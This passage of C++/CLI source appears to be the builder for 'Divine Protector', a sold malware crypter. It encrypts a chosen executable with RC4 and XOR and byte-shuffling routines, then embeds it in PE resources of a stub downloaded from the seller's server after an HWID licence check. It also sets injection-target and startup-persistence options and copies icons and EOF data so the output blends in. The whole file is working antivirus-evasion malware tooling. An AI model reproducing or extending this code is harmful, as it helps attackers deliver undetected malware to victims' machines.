   g15= g15 - 3;




   
   if (g != 0)
   {
   Write(g7,i);
   }
   
   if (g1 != 0)
   {
   Write(g13,i+1);
   }

   if (g2 != 0)
   {
   Write(g9,i+2);
   }

   if (g3 != 0)
   {
   Write(g11,i+3);
   }

    
   if (g4 != 0)
   {
   Write(g12,i+4);
   }
   
   if (g5 != 0)
   {
   Write(g10,i+5);
   }

   if (g6 != 0)
   {
   Write(g14,i+6);
   }

   if (g7 != 0)
   {
   Write(g,i+7);
   }

    if (g8 != 0)
   {
   Write(g15,i+8);
   }
   
   if (g9 != 0)
   {
   Write(g2,i+9);
   }

   if (g10 != 0)
   {
   Write(g5,i+10);
   }

   if (g11 != 0)
   {
   Write(g3,i+11);
   }

    
   if (g12 != 0)
   {
   Write(g4,i+12);
   }
   
   if (g13 != 0)
   {
   Write(g1,i+13);
   }

   if (g14 != 0)
   {
   Write(g6,i+14);
   }

   if (g15 != 0)
   {
   Write(g8,i+15);
   }

   i = i + 15;
   

   }
    
   if(l % 16 != 0)
   {
    
   for(i = 0;i < l % 16;i++)
   {
   Write(p[l-i],l-i);
   }


   }

}

void swap(char p[])
{
    
   int g=0,g1=0,g2=0,g3=0,g4=0,g5=0,g6=0,g7=0,g8=0,g9=0,g10=0,g11=0,g12=0,g13=0,g14=0,g15=0;
   int i,l;

   l = strlen(p);

   for ( i = 0;i < l - (l % 16);i++)
   {

   g = int(p[i]);
   g = g - 1;

   g1 = int(p[i+1]);
   g1 = g1 - 1;

   g2 = int(p[i+2]);
   g2 = g2 - 1;

   g3 = int(p[i+3]);
   g3 = g3 - 1;

   g4 = int(p[i+4]);
   g4 = g4 - 1;

   g5 = int(p[i+5]);
   g5 = g5 - 1;

   g6 = int(p[i+6]);
   g6 = g6 - 1;

   g7 = int(p[i+7]);
   g7 = g7 - 1;

    g8 = int(p[i+8]);
   g8 = g8 - 1;

   g9 = int(p[i+9]);
   g9 = g9 - 1;

   g10 = int(p[i+10]);
   g10 = g10 - 1;

   g11 = int(p[i+11]);
   g11 = g11 - 1;

   g12= int(p[i+12]);
   g12= g12 - 1;

   g13= int(p[i+13]);
   g13= g13 - 1;

   g14= int(p[i+14]);
   g14= g14 - 1;

   g15= int(p[i+15]);
   g15= g15 - 1;




   
   if (g != 0)
   {
   Write(g8,i);
   }
   
   if (g1 != 0)
   {
   Write(g9,i+1);
   }

   if (g2 != 0)
   {
   Write(g10,i+2);
   }

   if (g3 != 0)
   {
   Write(g11,i+3);
   }

    
   if (g4 != 0)
   {
   Write(g12,i+4);
   }
   
   if (g5 != 0)
   {
   Write(g13,i+5);
   }

   if (g6 != 0)
   {
   Write(g14,i+6);
   }

   if (g7 != 0)
   {
   Write(g15,i+7);
   }

    if (g8 != 0)
   {
   Write(g,i+8);
   }
   
   if (g9 != 0)
   {
   Write(g1,i+9);
   }

   if (g10 != 0)
   {
   Write(g2,i+10);
   }

   if (g11 != 0)
   {
   Write(g3,i+11);
   }

    
   if (g12 != 0)
   {
   Write(g4,i+12);
   }
   
   if (g13 != 0)
   {
   Write(g5,i+13);
   }

   if (g14 != 0)
   {
   Write(g6,i+14);
   }

   if (g15 != 0)
   {
   Write(g7,i+15);
   }

   i = i + 15;
   

   }
    
   if(l % 16 != 0)
   {
    
   for(i = 0;i < l % 16;i++)
   {
   Write(p[l-i],l-i);
   }


   }

}

void unswap(char p[])
{
    
   int g=0,g1=0,g2=0,g3=0,g4=0,g5=0,g6=0,g7=0,g8=0,g9=0,g10=0,g11=0,g12=0,g13=0,g14=0,g15=0;
   int i,l;

   l = strlen(p);

   for ( i = 0;i < l - (l % 16);i++)
   {

   g = int(p[i]);
   g = g + 1;

   g1 = int(p[i+1]);
   g1 = g1 + 1;

   g2 = int(p[i+2]);
   g2 = g2 + 1;

   g3 = int(p[i+3]);
   g3 = g3 + 1;

   g4 = int(p[i+4]);
   g4 = g4 + 1;

   g5 = int(p[i+5]);
   g5 = g5 + 1;

   g6 = int(p[i+6]);
   g6 = g6 + 1;

   g7 = int(p[i+7]);
   g7 = g7 + 1;

    g8 = int(p[i+8]);
   g8 = g8 + 1;

   g9 = int(p[i+9]);
   g9 = g9 + 1;

   g10 = int(p[i+10]);
   g10 = g10 + 1;

   g11 = int(p[i+11]);
   g11 = g11 + 1;

   g12= int(p[i+12]);
   g12= g12 + 1;

   g13= int(p[i+13]);
   g13= g13 + 1;

   g14= int(p[i+14]);
   g14= g14 + 1;

   g15= int(p[i+15]);
   g15= g15 + 1;




   
   if (g != 0)
   {
   Write(g8,i);
   }
   
   if (g1 != 0)
   {
   Write(g9,i+1);
   }

   if (g2 != 0)
   {
   Write(g10,i+2);
   }

   if (g3 != 0)
   {
   Write(g11,i+3);
   }

    
   if (g4 != 0)
   {
   Write(g12,i+4);
   }
   
   if (g5 != 0)
   {
   Write(g13,i+5);
   }

   if (g6 != 0)
   {
   Write(g14,i+6);
   }

   if (g7 != 0)
   {
   Write(g15,i+7);
   }

    if (g8 != 0)
   {
   Write(g,i+8);
   }
   
   if (g9 != 0)
   {
   Write(g1,i+9);
   }

   if (g10 != 0)
   {
   Write(g2,i+10);
   }

   if (g11 != 0)
   {
   Write(g3,i+11);
   }

    
   if (g12 != 0)
   {
   Write(g4,i+12);
   }
   
   if (g13 != 0)
   {
   Write(g5,i+13);
   }

   if (g14 != 0)
   {
   Write(g6,i+14);
   }

   if (g15 != 0)
   {
   Write(g7,i+15);
   }

   i = i + 15;
   

   }
    
   if(l % 16 != 0)
   {
    
   for(i = 0;i < l % 16;i++)
   {
   Write(p[l-i],l-i);
   }


   }

}

void bump(char p[])
{
    
   int g=0,g1=0,g2=0,g3=0,g4=0,g5=0,g6=0,g7=0,g8=0,g9=0,g10=0,g11=0,g12=0,g13=0,g14=0,g15=0;
   int i,l;

   l = strlen(p);

   for ( i = 0;i < l - (l % 16);i++)
   {

   g = int(p[i]);
   g = g - 4;

   g1 = int(p[i+1]);
   g1 = g1 - 4;

   g2 = int(p[i+2]);
   g2 = g2 - 4;

   g3 = int(p[i+3]);
   g3 = g3 - 4;

   g4 = int(p[i+4]);
   g4 = g4 - 4;

   g5 = int(p[i+5]);
   g5 = g5 - 4;

   g6 = int(p[i+6]);
   g6 = g6 - 4;

   g7 = int(p[i+7]);
   g7 = g7 - 4;

    g8 = int(p[i+8]);
   g8 = g8 - 4;

   g9 = int(p[i+9]);
   g9 = g9 - 4;

   g10 = int(p[i+10]);
   g10 = g10 - 4;

   g11 = int(p[i+11]);
   g11 = g11 - 4;

   g12= int(p[i+12]);
   g12= g12 - 4;

   g13= int(p[i+13]);
   g13= g13 - 4;

   g14= int(p[i+14]);
   g14= g14 - 4;

   g15= int(p[i+15]);
   g15= g15 - 4;




   
   if (g != 0)
   {
   Write(g6,i);
   }
   
   if (g1 != 0)
   {
   Write(g7,i+1);
   }

   if (g2 != 0)
   {
   Write(g8,i+2);
   }

   if (g3 != 0)
   {
   Write(g9,i+3);
   }

    
   if (g4 != 0)
   {
   Write(g14,i+4);
   }
   
   if (g5 != 0)
   {
   Write(g15,i+5);
   }

   if (g6 != 0)
   {
   Write(g,i+6);
   }

   if (g7 != 0)
   {
   Write(g1,i+7);
   }

    if (g8 != 0)
   {
   Write(g2,i+8);
   }
   
   if (g9 != 0)
   {
   Write(g3,i+9);
   }

   if (g10 != 0)
   {
   Write(g12,i+10);
   }

   if (g11 != 0)
   {
   Write(g13,i+11);
   }

    
   if (g12 != 0)
   {
   Write(g10,i+12);
   }
   
   if (g13 != 0)
   {
   Write(g11,i+13);
   }

   if (g14 != 0)
   {
   Write(g4,i+14);
   }

   if (g15 != 0)
   {
   Write(g5,i+15);
   }

   i = i + 15;
   

   }
    
   if(l % 16 != 0)
   {
    
   for(i = 0;i < l % 16;i++)
   {
   Write(p[l-i],l-i);
   }


   }

}

void unbump(char p[])
{
    
   int g=0,g1=0,g2=0,g3=0,g4=0,g5=0,g6=0,g7=0,g8=0,g9=0,g10=0,g11=0,g12=0,g13=0,g14=0,g15=0;
   int i,l;

   l = strlen(p);

   for ( i = 0;i < l - (l % 16);i++)
   {

   g = int(p[i]);
   g = g + 4;

   g1 = int(p[i+1]);
   g1 = g1 + 4;

   g2 = int(p[i+2]);
   g2 = g2 + 4;

   g3 = int(p[i+3]);
   g3 = g3 + 4;

   g4 = int(p[i+4]);
   g4 = g4 + 4;

   g5 = int(p[i+5]);
   g5 = g5 + 4;

   g6 = int(p[i+6]);
   g6 = g6 + 4;

   g7 = int(p[i+7]);
   g7 = g7 + 4;

    g8 = int(p[i+8]);
   g8 = g8 + 4;

   g9 = int(p[i+9]);
   g9 = g9 + 4;

   g10 = int(p[i+10]);
   g10 = g10 + 4;

   g11 = int(p[i+11]);
   g11 = g11 + 4;

   g12= int(p[i+12]);
   g12= g12 + 4;

   g13= int(p[i+13]);
   g13= g13 + 4;

   g14= int(p[i+14]);
   g14= g14 + 4;

   g15= int(p[i+15]);
   g15= g15 + 4;




   
   if (g != 0)
   {
   Write(g6,i);
   }
   
   if (g1 != 0)
   {
   Write(g7,i+1);
   }

   if (g2 != 0)
   {
   Write(g8,i+2);
   }

   if (g3 != 0)
   {
   Write(g9,i+3);
   }

   if (g4 != 0)
   {
   Write(g14,i+4);
   }
   
   if (g5 != 0)
   {
   Write(g15,i+5);
   }

   if (g6 != 0)
   {
   Write(g,i+6);
   }

   if (g7 != 0)
   {
   Write(g1,i+7);
   }

    if (g8 != 0)
   {
   Write(g2,i+8);
   }
   
   if (g9 != 0)
   {
   Write(g3,i+9);
   }

   if (g10 != 0)
   {
   Write(g12,i+10);
   }

   if (g11 != 0)
   {
   Write(g13,i+11);
   }

   if (g12 != 0)
   {
   Write(g10,i+12);
   }
   
   if (g13 != 0)
   {
   Write(g11,i+13);
   }

   if (g14 != 0)
   {
   Write(g4,i+14);
   }

   if (g15 != 0)
   {
   Write(g5,i+15);
   }

   i = i + 15;
   

   }
    
   if(l % 16 != 0)
   {
    
   for(i = 0;i < l % 16;i++)
   {
   Write(p[l-i],l-i);
   }


   }

}

void checkstub()
{

					   SetFileAttributesA("stub.exe", FILE_ATTRIBUTE_NORMAL);
					   DeleteFileA("stub.exe");

HRESULT hr;
hr = URLDownloadToFileA(NULL,stub,"stub.exe",0,NULL);

}

/*void checkgui()
{


					   SetFileAttributesA("Crypter1.2.rar", FILE_ATTRIBUTE_NORMAL);
					   DeleteFileA("Crypter1.2.rar");

HRESULT hr;
hr = URLDownloadToFileA(NULL,"http://divineprotector.com/pike/1.2.txt","Crypter1.2.rar",0,NULL);

}
*/
bool Postoji(const char * filename)
{
return GetFileAttributesA(filename) != 0xFFFFFFFF;
}

void proveri()
{

	SetFileAttributesA("ajoj", FILE_ATTRIBUTE_NORMAL);
	DeleteFileA("ajoj");

	strcat(osnova,"test.txt");

	DeleteUrlCacheEntryA(osnova);
	HRESULT hr;
    hr = URLDownloadToFileA(NULL,osnova,"ajoj",0,NULL);


}

	private: System::Void Form1_Load(System::Object^  sender, System::EventArgs^  e) {


				array<String^>^arguments = Environment::GetCommandLineArgs();

				 //System::Windows::Forms::MessageBox::Show( arguments[0],L"Pike" ,System::Windows::Forms::MessageBoxButtons::OK);
				
				OutputDebugStringA( "%s%s%s%s%s%s%s%s%s%s%s"
                "%s%s%s%s%s%s%s%s%s%s%s%s%s"
                "%s%s%s%s%s%s%s%s%s%s%s%s%s"
                "%s%s%s%s%s%s%s%s%s%s%s%s%s"); 

				 try { 

					 //System::Windows::Forms::MessageBox::Show( arguments[1],L"Pike" ,System::Windows::Forms::MessageBoxButtons::OK);
		               
					   HANDLE xetum = CreateMutex(NULL, FALSE, L"Divine Protector");

	                   if (GetLastError() == ERROR_ALREADY_EXISTS)
					   {
		                    MessageBox(NULL,"Divine Protector already started!","Divine Protector",NULL);
							   ExitProcess(0);
				       }
					  
					   delay = "0";

					   hwid = (char*)(void*)Marshal::StringToHGlobalAnsi(arguments[1]);

					   
					   hwid[strlen(hwid)-2] = '\0';

					   strcat(osnova,hwid);
					   strcat(osnova,"/");

					   strcat(stub,osnova);
					   strcat(stub,hwid);

					   DeleteUrlCacheEntryA(osnova);

					   proveri();

					   if(Postoji("ajoj") == true)
					   {
						     SetFileAttributesA("ajoj", FILE_ATTRIBUTE_NORMAL);
	                         DeleteFileA("ajoj");   
					   }
					   else
					   {
                               MessageBox(NULL,"Contact sm2495@gmail.com for buying Divine Protector!","Divine Protector",NULL);
							   ExitProcess(0);
					   }

					   DeleteUrlCacheEntryA(stub);


					   /*checkgui();

					   if(Postoji("Crypter1.2.rar") == true)
					   {

						   MessageBox(NULL,"New version of Divine Protector is available, delete all previous files and extract new files from 'Crypter1.1.rar' !","Divine Protector",NULL);
	                       ExitProcess(0);

					   }
					   */


				 } 
catch (Exception^ ex) 
{ 
	 MessageBox(NULL,"Trying to bypass HWID or what?","Divine Protector",NULL);
					ExitProcess(0);
}
catch (...) 
{ 
	 MessageBox(NULL,"Trying to bypass HWID or what?","Divine Protector",NULL);
					ExitProcess(0);
}

                    listBox1->SetSelected(0,true);

			 }
private: System::Void button2_Click(System::Object^  sender, System::EventArgs^  e) {

			 if(openFileDialog1->ShowDialog() == System::Windows::Forms::DialogResult::OK)
      {
        name->Text = openFileDialog1->FileName;
            
      }

		 }
private: System::Void button2_Click_1(System::Object^  sender, System::EventArgs^  e) {

			 if(openFileDialog1->ShowDialog() == System::Windows::Forms::DialogResult::OK)
      {
        name->Text = openFileDialog1->FileName;
		naziv = (char*)(void*)Marshal::StringToHGlobalAnsi(name->Text->ToString());
            
      }
		 }
private: System::Void checkBox1_CheckedChanged(System::Object^  sender, System::EventArgs^  e) {

			 if( checkBox1->Checked  == true )
			 {
               startup -> Enabled = true;
			   label1 -> Enabled = true;
			   addstartup = true;
			 }
			 if( checkBox1->Checked  == false )
			 {
               startup -> Enabled = false;
			   label1 -> Enabled = false;
			   addstartup = false;
			 }

		 }
private: System::Void checkBox2_CheckedChanged(System::Object^  sender, System::EventArgs^  e) {

		 if(self -> Checked == true)
			 {
			   listBox1 -> Enabled = false;
			   process -> Checked = false;
			   selfinject = true;
			 }
		  if(self -> Checked == false)
			 { 
			   listBox1 -> Enabled = true;
			   process -> Checked = true;
			   selfinject = false;
			 }

		 }
private: System::Void tabPage1_Click(System::Object^  sender, System::EventArgs^  e) {
		 }
private: System::Void listBox1_SelectedIndexChanged(System::Object^  sender, System::EventArgs^  e) {

			 //MessageBox::Show(listBox1->SelectedItem->ToString());
			 
			 inject = (char*)(void*)Marshal::StringToHGlobalAnsi(listBox1->SelectedItem->ToString());
			 //MessageBox(NULL,inject,NULL,NULL);


		 }
private: System::Void process_CheckedChanged(System::Object^  sender, System::EventArgs^  e) {


			 if(process -> Checked == true)
			 {
			   listBox1 -> Enabled = true;
			   self -> Checked = false;
			   selfinject = false;
			 }
             
			 if(process -> Checked == false)
			 {
			   listBox1 -> Enabled = false;
			   self -> Checked = true;
			   selfinject = true;
			 }



		 }
private: System::Void startup_TextChanged(System::Object^  sender, System::EventArgs^  e) {

			 start = (char*)(void*)Marshal::StringToHGlobalAnsi(startup->Text->ToString());
			 //MessageBox(NULL,start,NULL,NULL);
		 }



void RDF() 
{
DWORD bt; 
SetFileAttributesA("Done.exe", FILE_ATTRIBUTE_NORMAL);
DeleteFile((LPCTSTR)"Done.exe");
CopyFileA("stub.exe","Done.exe",0);
HANDLE efile= CreateFileA(naziv,GENERIC_WRITE | GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
fs = GetFileSize(efile,NULL);
FB = new char[fs+(fs/2)];
ReadFile(efile,FB,fs,&bt,NULL);
CloseHandle(efile);
}

void GetFile(char * name) 
{
DWORD bt; 
HANDLE efile= CreateFileA(name,GENERIC_WRITE | GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
gh = GetFileSize(efile,NULL);
Bind = new char[gh];
ReadFile(efile,Bind,gh,&bt,NULL);
CloseHandle(efile);
}

void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
    HANDLE hResource  = NULL;
    hResource = BeginUpdateResource(szTargetPE, FALSE);
    UpdateResource(hResource,RT_RCDATA, MAKEINTRESOURCE(id),MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),(LPVOID) lpBytes,dwSize);
    EndUpdateResource(hResource, FALSE);

}

void WriteStartup(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
    HANDLE hResource  = NULL;
    hResource = BeginUpdateResource(szTargetPE, FALSE);
    UpdateResource(hResource,MAKEINTRESOURCE(13), MAKEINTRESOURCE(id),MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),(LPVOID) lpBytes,dwSize);
    EndUpdateResource(hResource, FALSE);
}

void WriteArguments(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
    HANDLE hResource  = NULL;
    hResource = BeginUpdateResource(szTargetPE, FALSE);
    UpdateResource(hResource,MAKEINTRESOURCE(14), MAKEINTRESOURCE(id),MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),(LPVOID) lpBytes,dwSize);
    EndUpdateResource(hResource, FALSE);
}

IMAGE_DOS_HEADER * GetDosHeader(byte * hMapping)
{
    IMAGE_DOS_HEADER * IDH = NULL;
    IDH = (IMAGE_DOS_HEADER*)hMapping;
    if(IDH != NULL)
    {
        return IDH;
    }
    return 0;
}

IMAGE_NT_HEADERS * GetNtHeader(byte * hMapping,IMAGE_DOS_HEADER * IDH)
{
    IMAGE_NT_HEADERS * INH = NULL;
    INH = (IMAGE_NT_HEADERS*)(hMapping + IDH->e_lfanew);
    if(INH != NULL)
    {
        return INH;
    }
    return 0;
}

IMAGE_SECTION_HEADER * GetSectionHeader(byte * hMapping,IMAGE_DOS_HEADER * IDH)
{
    IMAGE_SECTION_HEADER * ISH = NULL;
    ISH = (IMAGE_SECTION_HEADER*)(hMapping + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    if(ISH != NULL)
    {
        return ISH;
    }
    return 0;
}

bool isPEFile(byte * pMapping)
{
    bool isPE = false;
    IMAGE_DOS_HEADER* IDH = NULL;
    IDH = (IMAGE_DOS_HEADER*)pMapping;
    if(IDH != NULL)
    {
        if(IDH->e_magic == IMAGE_DOS_SIGNATURE)
        {
            IMAGE_NT_HEADERS* INH = NULL;
            INH = (IMAGE_NT_HEADERS*)(pMapping + IDH->e_lfanew);
            if(INH != NULL)
            {
                if(INH->Signature == IMAGE_NT_SIGNATURE)
                {
                    isPE = true;
                }
            }
        }
    }
    return isPE;
}

bool HasEOF(char * sPath,DWORD &EofStart, DWORD &EofSize)
{
    byte * pMapping;
    HANDLE hFile;
    HANDLE hMapping;
    DWORD dwFileSize = 0;
    DWORD dwOrgSize = 0;
    hFile = CreateFileA(sPath,GENERIC_READ,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hFile != INVALID_HANDLE_VALUE)
    {
        dwFileSize = GetFileSize(hFile,NULL);
        if(dwFileSize != INVALID_FILE_SIZE)
        {
            hMapping = CreateFileMapping(hFile,NULL,PAGE_READONLY,0,0,0);
            if(hMapping != INVALID_HANDLE_VALUE)
            {
                pMapping = (byte*)MapViewOfFile(hMapping,FILE_MAP_READ,0,0,0);
                IMAGE_DOS_HEADER* IDH;
                IMAGE_NT_HEADERS* INH;
                IMAGE_SECTION_HEADER* ISH;
                IDH = GetDosHeader(pMapping);
                if(isPEFile(pMapping))
                {
                    INH = GetNtHeader(pMapping,IDH);
                    ISH = (IMAGE_SECTION_HEADER*)(pMapping + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + ((INH->FileHeader.NumberOfSections-1) * sizeof(IMAGE_SECTION_HEADER)));
                    dwOrgSize = ISH->PointerToRawData + ISH->SizeOfRawData;
                    if(dwOrgSize < dwFileSize)
                    {
                        EofStart = dwOrgSize + 1;
                        EofSize = dwFileSize - dwOrgSize;
                        CloseHandle(hFile);
                        CloseHandle(hMapping);
                        UnmapViewOfFile(pMapping);
                        return true;
                    }
                }
                else
                {
                    CloseHandle(hFile);
                    CloseHandle(hMapping);
                    UnmapViewOfFile(pMapping);
                    return false;
                }

            }
            CloseHandle(hFile);
        }

    }
}

void WriteEof()
{

	HANDLE hFile;
    char *StubData=NULL;
    DWORD dwFileSize,dwNumRead;
    PIMAGE_DOS_HEADER pDOS;
    PIMAGE_NT_HEADERS pNT;
    PIMAGE_SECTION_HEADER pSections;
    BYTE* pEOFData;
	DWORD dwBytesWritten;
	unsigned long s,h;


    hFile = CreateFileA(naziv, GENERIC_READ, FILE_SHARE_READ,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    dwFileSize = GetFileSize(hFile, NULL);

    StubData=(char*)GlobalAlloc(GMEM_FIXED,dwFileSize);
    ReadFile(hFile, StubData, dwFileSize, &dwNumRead,NULL);
    CloseHandle(hFile);

    pDOS = (PIMAGE_DOS_HEADER)StubData;
    if(pDOS->e_magic==IMAGE_DOS_SIGNATURE)
    {
        pNT = (PIMAGE_NT_HEADERS)((char*)pDOS + pDOS->e_lfanew);
        if(pNT->Signature==IMAGE_NT_SIGNATURE)
        {
            pSections = (PIMAGE_SECTION_HEADER)((char*)pNT + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +
                pNT->FileHeader.SizeOfOptionalHeader);
            pEOFData = (BYTE*)pDOS + 
                pSections[pNT->FileHeader.NumberOfSections-1].PointerToRawData + 
                pSections[pNT->FileHeader.NumberOfSections-1].SizeOfRawData;
        }
        else
            MessageBox(NULL,"EOF Not Found (NT)","Divine Protector",MB_OK);
    }
    else
        MessageBox(NULL,"EOF Not Found (DOS)","Divine Protector",MB_OK);

    GlobalFree(StubData);

	HasEOF(naziv,s,h);

	if(s != h)
	{

     pEOFData[h] = '\0';

	}

HANDLE hAppend = CreateFileA("Done.exe", FILE_APPEND_DATA , FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); 

DWORD dwPtr = SetFilePointer(hAppend, 0, NULL, FILE_END);

WriteFile(hAppend, pEOFData, strlen((char*)pEOFData), &dwBytesWritten, NULL);
	
CloseHandle(hAppend);



}


BOOL AddIcon(LPSTR szIFileName, LPSTR szEFileName)
{

	int i;

	HANDLE hFile = CreateFileA(szIFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	LPICONDIR lpid;
	lpid = (LPICONDIR)malloc(sizeof(ICONDIR));
	if(lpid == NULL)
	{
		return FALSE;
	}
	DWORD dwBytesRead;
	ReadFile(hFile, &lpid->idReserved, sizeof(WORD), &dwBytesRead, NULL);
	ReadFile(hFile, &lpid->idType, sizeof(WORD), &dwBytesRead, NULL);
	ReadFile(hFile, &lpid->idCount, sizeof(WORD), &dwBytesRead, NULL);
	lpid = (LPICONDIR)realloc(lpid, (sizeof(WORD) * 3) + (sizeof(ICONDIRENTRY) * lpid->idCount));
	if(lpid == NULL)
	{
		return FALSE;
	}
	ReadFile(hFile, &lpid->idEntries[0], sizeof(ICONDIRENTRY) * lpid->idCount, &dwBytesRead, NULL);
	LPGRPICONDIR lpgid;
	lpgid = (LPGRPICONDIR)malloc(sizeof(GRPICONDIR));
	if(lpgid == NULL)
	{
		return FALSE;
	}
	lpgid->idReserved = lpid->idReserved;
	lpgid->idType = lpid->idType;
	lpgid->idCount = lpid->idCount;
	lpgid = (LPGRPICONDIR)realloc(lpgid, (sizeof(WORD) * 3) + (sizeof(GRPICONDIRENTRY) * lpgid->idCount));
	if(lpgid == NULL)
	{
		return FALSE;
	}
	for(i = 0; i < lpgid->idCount; i++)
	{
		lpgid->idEntries[i].bWidth = lpid->idEntries[i].bWidth;
		lpgid->idEntries[i].bHeight = lpid->idEntries[i].bHeight;
		lpgid->idEntries[i].bColorCount = lpid->idEntries[i].bColorCount;
		lpgid->idEntries[i].bReserved = lpid->idEntries[i].bReserved;
		lpgid->idEntries[i].wPlanes = lpid->idEntries[i].wPlanes;
		lpgid->idEntries[i].wBitCount = lpid->idEntries[i].wBitCount;
		lpgid->idEntries[i].dwBytesInRes = lpid->idEntries[i].dwBytesInRes;
		lpgid->idEntries[i].nID = i + 1;
	}
	HANDLE hUpdate;
	hUpdate = BeginUpdateResourceA(szEFileName, TRUE);
	if(hUpdate == NULL)
	{
		CloseHandle(hFile);
		return FALSE;
	}
	for(i = 0; i < lpid->idCount; i++)
	{
		LPBYTE lpBuffer = (LPBYTE)malloc(lpid->idEntries[i].dwBytesInRes);
		if(lpBuffer == NULL)
		{
			CloseHandle(hFile);
			return FALSE;
		}
		SetFilePointer(hFile, lpid->idEntries[i].dwImageOffset, NULL, FILE_BEGIN);
		ReadFile(hFile, lpBuffer, lpid->idEntries[i].dwBytesInRes, &dwBytesRead, NULL);
		if(UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(lpgid->idEntries[i].nID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpBuffer[0], lpid->idEntries[i].dwBytesInRes) == FALSE)
		{
			CloseHandle(hFile);
			free(lpBuffer);
			return FALSE;
		}
		free(lpBuffer);
	}
	CloseHandle(hFile);
	if(UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpgid[0], (sizeof(WORD) * 3) + (sizeof(GRPICONDIRENTRY) * lpgid->idCount)) == FALSE)
	{
		return FALSE;
	}
	if(EndUpdateResource(hUpdate, FALSE) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}

void reverse(char p[])
{
     int len=strlen(p);
     char t;
     for(int i=(--len), j=0; i>len/2; i--, j++)
     {
          t=p[i];
          p[i]=p[j];
          p[j]=t;
     }
}

int to_int(char c)
{
     switch(c)
     {   
          case '0': return 0 ;
          case '1': return 1 ;
          case '2': return 2 ;
          case '3': return 3 ;
          case '4': return 4 ;
          case '5': return 5 ;
          case '6': return 6 ;
          case '7': return 7 ;
          case '8': return 8 ;
          case '9': return 9 ;

     }
}

void Crypt(char *inp, DWORD inplen, char* key, DWORD keylen)
{
    //we will consider size of sbox 256 bytes
    //(extra byte are only to prevent any mishep just in case)
    char Sbox[257], Sbox2[257];
    unsigned long i, j, t, x;

    //this unsecured key is to be used only when there is no input key from user
    static const char  OurUnSecuredKey[] = "sm2495@gmail.com";
    static const int OurKeyLen = strlen(OurUnSecuredKey);    
    char temp , k;
    i = j = k = t =  x = 0;
    temp = 0;

    //always initialize the arrays with zero
    ZeroMemory(Sbox, sizeof(Sbox));
    ZeroMemory(Sbox2, sizeof(Sbox2));

    //initialize sbox i
    for(i = 0; i < 256U; i++)
    {
        Sbox[i] = (char)i;
    }

    j = 0;
    //whether user has sent any inpur key
    if(keylen)
    {
        //initialize the sbox2 with user key
        for(i = 0; i < 256U ; i++)
        {
            if(j == keylen)
            {
                j = 0;
            }
            Sbox2[i] = key[j++];
        }    
    }
    else
    {
        //initialize the sbox2 with our key
        for(i = 0; i < 256U ; i++)
        {
            if(j == OurKeyLen)
            {
                j = 0;
            }
            Sbox2[i] = OurUnSecuredKey[j++];
        }
    }

    j = 0 ; //Initialize j
    //scramble sbox1 with sbox2
    for(i = 0; i < 256; i++)
    {
        j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
        temp =  Sbox[i];                    
        Sbox[i] = Sbox[j];
        Sbox[j] =  temp;
    }

    i = j = 0;
    for(x = 0; x < inplen; x++)
    {
        //increment i
        i = (i + 1U) % 256U;
        //increment j
        j = (j + (unsigned long) Sbox[i]) % 256U;

        //Scramble SBox #1 further so encryption routine will
        //will repeat itself at great interval
        temp = Sbox[i];
        Sbox[i] = Sbox[j] ;
        Sbox[j] = temp;

        //Get ready to create pseudo random  byte for encryption key
        t = ((unsigned long) Sbox[i] + (unsigned long) Sbox[j]) %  256U ;

        //get the random byte
        k = Sbox[t];

        //xor with the data and done
        inp[x] = (inp[x] ^ k);
    }    
}


void enc() // The function that Encrypts the info on the FB buffer
{
	char cipher[50];
	strcpy(cipher,Key);
for (int i = 0; i < fs; i++)
    FB[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
}

void enc2() // The function that Encrypts the info on the FB buffer
{
   char cipher[50];
  strcpy(cipher,Key);
for (int i = 0; i < gh; i++)
    Bind[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
}


void GetFileName(char *filename, char *filepath) 
{

 if(NULL == filename) return;
 if(NULL == filepath) return;

 CHAR tmp[MAX_PATH]="";

 if (strrchr(filepath, '\\') != NULL) {
    strcpy( tmp, strrchr(filepath, '\\') + 1 );
 }
 else if (strrchr(filepath, '/') != NULL) {
    strcpy( tmp, strrchr(filepath, '/') + 1 );
 }
 else {
    strcpy( tmp, "" );
 }

 strcpy( filename, tmp );
}

void encrypt(char pike[])
{
     for(int i = 0;i<strlen(pike);i++)
	 {

       pike[i] = char(int(int( pike[i])+1));

	 }
reverse(pike);

}


private: System::Void button1_Click(System::Object^  sender, System::EventArgs^  e) 
		 {

             if(name->Text == "")
			 {

				 MessageBox(NULL,"Choose File to Crypt!","Divine Protector",NULL);
				 return;

			 }

		   	checkstub();

            RDF();

			//StartMyThread();

			SetFileAttributesA("stub.exe", FILE_ATTRIBUTE_NORMAL);
			DeleteFileA("stub.exe");

	       
			  if(Icons->Text != "")
			 {

				 if(AddIcon(ikonica,"Done.exe") == 0)
				 {

					 MessageBox(NULL,"Fail to Add Icon!","Divine Protector",NULL);
					 return;
				 }

			 }

			  if(cmd->Checked == true)
			 {

				if(argument != "")
